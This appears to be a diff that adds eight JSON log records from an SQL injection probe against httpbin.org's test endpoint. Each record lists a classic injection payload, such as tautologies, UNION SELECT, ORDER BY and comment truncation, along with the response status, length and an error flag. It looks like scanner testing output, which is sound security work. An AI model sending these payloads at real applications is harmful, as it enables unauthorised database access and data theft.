@@ -1,0 +1,8 @@
+{"url": "https://httpbin.org/get?id=%27+OR+%271%27%3D%271", "param": "id", "payload": "' OR '1'='1", "status": 503, "length": 564, "error_signature": false}
+{"url": "https://httpbin.org/get?id=%27+OR+%271%27%3D%271%27+--", "param": "id", "payload": "' OR '1'='1' --", "status": 503, "length": 564, "error_signature": false}
+{"url": "https://httpbin.org/get?id=%27+OR+%271%27%3D%271%27+%2F%2A", "param": "id", "payload": "' OR '1'='1' /*", "status": 503, "length": 564, "error_signature": false}
+{"url": "https://httpbin.org/get?id=%27+UNION+SELECT+NULL%2CNULL%2CNULL--", "param": "id", "payload": "' UNION SELECT NULL,NULL,NULL--", "status": 503, "length": 564, "error_signature": false}
+{"url": "https://httpbin.org/get?id=1%27+ORDER+BY+1--", "param": "id", "payload": "1' ORDER BY 1--", "status": 503, "length": 564, "error_signature": false}
+{"url": "https://httpbin.org/get?id=1%27+GROUP+BY+1--", "param": "id", "payload": "1' GROUP BY 1--", "status": 503, "length": 564, "error_signature": false}
+{"url": "https://httpbin.org/get?id=admin%27--", "param": "id", "payload": "admin'--", "status": 503, "length": 564, "error_signature": false}
+{"url": "https://httpbin.org/get?id=%27+OR+EXISTS%28SELECT+%2A+FROM+users%29--", "param": "id", "payload": "' OR EXISTS(SELECT * FROM users)--", "status": 503, "length": 564, "error_signature": false}
